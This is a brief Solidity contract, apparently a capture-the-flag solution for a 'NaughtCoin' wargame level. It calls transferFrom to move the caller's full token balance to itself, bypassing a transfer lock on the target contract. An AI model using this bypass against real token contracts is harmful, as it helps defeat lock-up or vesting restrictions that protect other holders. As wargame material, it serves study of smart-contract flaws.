// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface INaughtCoin {
    function transferFrom(address from,address to,uint256 value) external returns (bool);
}

contract NaughtCoinSolver {
    INaughtCoin instance;
    function solve(address _instance, uint256 total) public payable {
        instance = INaughtCoin(_instance);
        instance.transferFrom(msg.sender, address(this), total);   
    }
}
